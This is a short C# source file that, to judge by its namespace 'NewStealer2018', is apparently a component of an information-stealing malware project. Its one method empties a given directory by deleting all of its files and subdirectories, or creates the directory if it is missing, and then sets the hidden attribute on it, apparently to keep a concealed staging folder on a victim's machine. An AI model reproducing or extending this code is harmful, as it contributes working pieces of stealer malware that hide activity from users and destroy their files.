namespace NewStealer2018
{
    using System.IO;

    public class HomeDirectory
    {
        public static void Create(string HomeDir, bool Recursive)
        {
            var DirHome = new DirectoryInfo(HomeDir);
            if (DirHome.Exists)
            {
                foreach (FileInfo FileHome in DirHome.GetFiles())
                {
                    FileHome.Delete();
                }

                foreach (DirectoryInfo SubHome in DirHome.GetDirectories())
                {
                    SubHome.Delete(recursive: Recursive);
                }
                DirHome.Attributes |= FileAttributes.Hidden;
            }
            else
            {
                DirHome.Create();
                DirHome.Refresh();
                DirHome.Attributes |= FileAttributes.Hidden;
            }
        }
    }
}